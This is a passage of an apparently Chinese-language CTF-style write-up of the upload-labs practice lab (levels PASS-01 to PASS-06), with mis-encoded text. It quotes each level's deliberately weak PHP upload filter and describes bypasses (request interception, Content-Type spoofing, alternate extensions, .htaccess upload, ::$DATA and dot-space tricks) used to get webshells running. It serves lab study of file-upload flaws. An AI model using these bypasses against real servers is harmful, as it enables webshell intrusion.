class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å…³å½“æˆ‘ä»¬ä¸Šä¼ phpæ–‡ä»¶æ—¶ï¼Œå‰ç«¯å‡ºç°æ‹¦æˆªæ˜¾ç¤ºæˆ‘ä»¬åªèƒ½ä¸Šä¼ ä»¥ä¸‹ä¸‰ç§æ–‡ä»¶æ ¼å¼ã€‚åˆæ­¥åˆ¤æ–­åªæ˜¯å‰ç«¯æ‹¦æˆªï¼Œå¯ä»¥é€šè¿‡æŠ“åŒ…æ›´æ”¹æ–‡ä»¶æ ¼å¼è¿›è¡Œç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/cfcaf1a1cf9c474499f10f3e7f0f65e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>æˆ‘ä»¬æŠŠshell.phpæ–‡ä»¶é‡å‘½åä¸ºshell.jpgæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…ä¸Šä¼ ä¿®æ”¹ï¼Œæœ€åä½¿ç”¨å†°èå¯ä»¥ä¸Šçº¿æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/b1155c9002f0439dbccbca36557aae68.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h2><p>ä»æºç ä¸­å¯ä»¥åˆ¤æ–­æ˜¯é€šè¿‡MIMEç±»å‹è¿›è¡Œè¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬å°è¯•ä¸Šä¼ phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå®ƒä¸€æ ·ä¹Ÿåšäº†è¿‡æ»¤<br><img src="https://img-blog.csdnimg.cn/c4960976e2e440ca83595a85f7fbcab9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰€ä»¥æˆ‘ä»¬å†æ¬¡è¿›è¡ŒæŠ“åŒ…åˆ†æï¼ŒæŠ“åŒ…æ—¶æˆ‘ä»¬å°†<code>Content-Type</code>ç±»å‹çš„å€¼æ”¹ä¸ºimage/jpeg<br><img src="https://img-blog.csdnimg.cn/1f8a0582607c4e499035ae22595c1be7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€åèƒ½æˆåŠŸä¸Šçº¿ä¸»æœº<br><img src="https://img-blog.csdnimg.cn/055145b412104604bf55d786d1786cac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h2><p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¼€å‘è€…åªç¦æ­¢äº†å¸¸è§çš„å››ä¸ªæ–‡ä»¶åç¼€åï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ ä¸€äº›ä¸å¸¸è§çš„æ–‡ä»¶åç¼€åï¼Œä¾‹å¦‚php5ï¼Œphtmlç­‰ç­‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶æ—¶ï¼Œå®ƒæŠ¥å‡ºä¸èƒ½ä¸Šä¼ çš„æ–‡ä»¶åç¼€åï¼Œåˆæ­¥åˆ¤æ–­æˆ‘ä»¬å¸¸è§çš„æ–‡ä»¶åç¼€åéƒ½ä¸èƒ½ä¸Šä¼ æˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/792331611b5d4f73b0f74752013ed6c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»“æœå°±æ˜¯ç¡®å®å¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½æˆåŠŸè§£æä¸Šçº¿webshellï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ã€‚<br><img src="https://img-blog.csdnimg.cn/086afefa43ff471787b31fd65754d0cd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ¨¡ç³Šåç¼€åï¼Œé€šè¿‡åå…­è¿›åˆ¶åç¼€æˆªæ–­å¯ä»¥æˆåŠŸè§£æwebshell<br><img src="https://img-blog.csdnimg.cn/32a5889a1c1c47b69dbfd1edbc34beb2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/46d3effc083f4bbb88c3fbea10cd2ec3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h2><p>ä»æºä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œå‡ ä¹æŠŠæ‰€æœ‰å¸¸è§çš„æ–‡ä»¶åç¼€åéƒ½ç¦æ­¢äº†ã€‚ä½†æ˜¯å”¯ç‹¬æ²¡æœ‰ç¦æ­¢<code>.htaccess</code>æ–‡ä»¶çš„ä¸Šä¼ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°è¯•ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œå°†æ–‡ä»¶å†…å®¹è®¾ç½®ä¸ºå°†æ‰€æœ‰æ–‡ä»¶éƒ½å½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æ<br><img src="https://img-blog.csdnimg.cn/1865d34d8d944f06ab4f74871174752d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬æ–‡ä»¶ï¼Œæ˜¾ç¤ºäº†ä¸Šä¼ çš„è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/44ce0e8cf4164409a79033b13c1bb8dd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆåŠŸè§£æwebshell<br><img src="https://img-blog.csdnimg.cn/e93fa1245b8e41e4802f01d2ff22e52a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-05"><a href="#PASS-05" class="headerlink" title="PASS-05"></a>PASS-05</h2><p>ä»æºä»£ç ä¸­å¯ä»¥åˆ†æå‡ºï¼Œå¼€å‘è€…é™¤äº†è¿‡æ»¤äº†å¸¸è§çš„æ–‡ä»¶æ ¼å¼å¤–ï¼Œè¿˜è¿‡æ»¤äº†<code>.htaccess</code>æ–‡ä»¶å’Œç‚¹ã€::$DATAã€ç©ºæ ¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/76d355b7739042b2a9079c3d9e76426e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/ec06593593ff4389881268b98ee13ac0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/e49e5f7d48e245a19bc70572cc4fa6bb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/8e657f8906584cc9b21826e7e99401dd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><strong>è¡¥ï¼š</strong> è¿™é‡Œ<code>::$DATA</code>çš„åŸç†æ˜¯Windowsæ“ä½œç³»ç»Ÿä¼šå°†<code>::$DATA</code>å»é™¤ï¼Œæœ€åç•™ä¸‹æ–‡ä»¶åè¿›è¡Œè§£æï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ–¹å¼ç›¸åŒï¼Œé‡‡ç”¨ç‚¹ç©ºæ ¼ç‚¹çš„æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/beff52acf7eb4f62b6c3d517f7639735.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/2f38148c4f7544ee9e7fe817968e4ffb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS-06"></a>PASS-06</h2><p>å¯¹æ¯”ä¸Šä¸€å…³çš„æºç ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹æ–‡ä»¶åè¿›è¡Œå°å†™</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span 